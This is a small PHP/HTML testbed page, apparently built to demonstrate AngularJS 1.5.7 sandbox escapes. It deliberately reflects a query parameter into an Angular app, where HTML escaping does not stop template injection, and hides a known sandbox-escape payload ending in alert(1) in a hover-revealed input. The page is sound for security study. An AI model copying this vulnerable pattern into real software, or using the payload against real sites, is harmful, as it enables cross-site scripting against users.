<html>
    <head> 
        <meta charset="utf-8">
        <title>1.5.7 AngularJS Sandbox Demo</title>
        <script src="angular1.5.7.js"></script>
        <style>
        .showme, .showhim:hover .ok{ display: none; }
        .showhim:hover .showme{ display : block; }
        </style>
    </head>
    <body>
        <h3>Testbed for Angular JS version 1.5.7</h3>
        <form action="angular1.5.7.php">
            <input type="text" size="70" name="q" value="hello world">
            <input type="submit" value="go">
        </form>
        <div class="showhim">
           <div class="showme"><input type="text" size=70 value="{{'a'.constructor.prototype.charAt='a'.concat; $eval('exploit=1} } };alert(1)//');}}"></div>
           <div class="ok"><i>hidden 1.4.7</i></div>
        </div>
        <hr/>

            <b>Angular JS Expression:</b>
            <!-- start of AngularJS app -->
            <div ng-app>

<?php
    // GET parameter ?q= mit sicherem escaping
    $q = $_GET['q'];
    echo htmlspecialchars($q,ENT_QUOTES);
?>

            </div>
            <!-- end of AngularJS app -->
        <hr/>
        <div style="margin-top: 150px">
        </div>
    </body>
</html>
